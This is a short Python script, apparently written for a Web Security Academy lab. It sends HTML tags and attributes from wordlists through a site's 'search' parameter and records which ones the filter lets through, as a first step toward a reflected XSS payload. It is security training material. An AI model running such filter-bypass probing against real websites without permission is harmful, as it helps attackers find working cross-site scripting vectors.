import requests

url = "https://0a9f0016047d83e7808503c8007d00a9.web-security-academy.net/"
with open("lab14/lab13.txt") as f:
    tags = f.read().splitlines()
allowed_tags = []
with open("lab14/attrlist.txt") as f:
    attrs = f.read().splitlines()
allowed_attrs = []
for tag in tags:
    tag = tag.strip()
    if not tag:  # skip empty lines
        continue
    payload = f"<{tag}>"
    response = requests.get(url, params={"search": payload})

    if response.status_code == 200:
        allowed_tags.append(tag)
        print(f"{tag} alowed")
    else:
        print(f"{tag} is not allowed")

for alowed_tag in allowed_tags:
    for attr in attrs:
        payload = f"{attr}=1"
        response = requests.get(url, params={"search": f"<{alowed_tag} {attr}=1>"})

        if response.status_code == 200:
            allowed_attrs.append(attr)
            print(f"{attr} alowed")
        else:
            print(f"{attr} is not allowed")

print(allowed_tags)
print(allowed_attrs)
